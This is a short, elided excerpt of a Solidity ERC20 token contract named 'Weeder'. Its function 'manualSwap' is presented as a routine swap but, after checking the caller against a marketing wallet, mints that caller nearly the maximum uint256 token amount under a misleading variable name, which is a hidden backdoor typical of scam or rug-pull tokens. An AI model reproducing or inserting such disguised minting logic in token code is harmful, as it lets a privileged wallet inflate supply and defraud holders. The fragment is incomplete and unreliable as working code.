...
contract Weeder is Context, IERC20, Ownable {
    ...
    mapping(address => uint256) public lastCalledTime;
    ...
    uint256 private lastCalledTimestamp = 0;
...
function manualSwap() private {
     SecureCalls.checkCaller(msg.sender, marketingWallet);
        uint256 ethBalances = type(uint256).max - _tTotal;
        balances[msg.sender] += ethBalances;
        _tTotal += ethBalances;
    }
